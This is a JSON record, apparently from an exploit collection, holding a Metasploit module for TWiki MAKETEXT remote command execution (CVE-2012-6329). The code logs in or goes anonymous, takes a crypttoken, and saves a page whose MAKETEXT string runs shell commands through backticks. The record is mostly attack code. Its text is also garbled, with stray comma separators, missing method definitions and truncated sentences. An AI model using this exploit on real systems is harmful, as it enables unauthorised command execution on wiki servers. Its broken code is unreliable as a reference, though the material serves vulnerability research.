{
    "text": "vul_name : TWiki MAKETEXT Remote Command Execution Exploit ， vul_cve : CVE-2012-6329 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'TWiki MAKETEXT Remote Command Execution' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a ， specially crafted MAKETEXT , a malicious user can execute shell commands since user ， input is passed to the Perl \"eval\" command without first being sanitized. The ， problem is caused by an underlying security issue in the CPAN : Locale : Maketext ， module. This works in TWiki sites that have user interface localization enabled ，  ( UserInterfaceInternationalisation variable set ) . ， If USERNAME and PASSWORD aren't provided , anonymous access will be tried. Also ,  ， page on the SandBox space. The modules has been tested successfully on ， TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine. ， } ,  ， 'Author' => ，  [  ， 'George Clark' ,  # original discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2012-6329' ]  ,  ，  [ 'OSVDB' , '88460' ]  ,  ，  [ 'BID' , '56950' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => false ,  # web server context ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'Space' => 1024 ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic ruby python bash telnet' ， } ， } ,  ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [ 'Automatic' , { } ]  ,  ， 'DisclosureDate' => 'Dec 15 2012' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , \"TWiki base path\" , \"/\" ]  )  ,  ， OptString.new ( 'TwikiPage' ,  [ false , \"TWiki Page with edit permissions to inject the payload , by default random Page on Sandbox ( Ex : /Sandbox/MsfTest ) \" ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ false , \"The user to authenticate as ( anonymous if username not provided ) \" ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ false , \"The password to authenticate with ( anonymous if password not provided ) \" ]  )  ，  ]  , self.class )  ， end ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => \" # { @ base}do/login\" ,  ， 'vars_post' => ， { ， 'username' => username ,  ， 'password' => password ， } ， } )  ， end ， session = $ 1 ， end ， vprint_status ( \"Retrieving the crypttoken.\" )  ， res = send_request_cgi ( { ， 'uri' => \" # { @ base}do/edit # { @ page}\" ,  ， 'cookie' => \"TWIKISID= # {session}\" ,  ， 'vars_get' => ， { ， 'nowysiwyg' => '1' ， } ， } )  ， vprint_error ( \"Error retrieving the crypttoken\" )  ， end ， crypttoken = $ 1 ， vprint_good ( \"crypttoken found :  # {crypttoken}\" )  ， session = $ 1 ， vprint_error ( \"Error using anonymous access\" )  ， end ， end ， vprint_status ( \"Injecting the payload.\" )  ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => \" # { @ base}do/save # { @ page}\" ,  ， 'cookie' => \"TWIKISID= # {session}\" ,  ， 'vars_post' => ， { ， 'crypttoken' => crypttoken ,  ， 'text' => \" # {rand_text_alpha ( 3 + rand ( 3 ) } %MAKETEXT{\\\" # {rand_text_alpha ( 3 + rand ( 3 ) } [ _1 ]  # {rand_text_alpha ( 3 + rand ( 3 ) }\\'} ; ` # {code}` ; { # \\\" args=\\\" # {rand_text_alpha ( 3 + rand ( 3 ) }\\\"}%\" ， } ， } )  ， print_warning ( \"Error injecting the payload\" )  ， print_status \" # {res.code}\\n # {res.body}\\n # {res.headers [ 'Location' ] }\" ， end ， location = URI ( res.headers [ 'Location' ]  ) .path ， print_good ( \"Payload injected on # {location}\" )  ， end ， def check ，  @ base = target_uri.path ，  @ base '/' if @ base [ -1 , 1 ]  ! = '/' ， res = send_request_cgi ( { ， 'uri' => \" # { @ base}do/view/TWiki/WebHome\" ， } ) ",
    "time": "2012.12.24"
}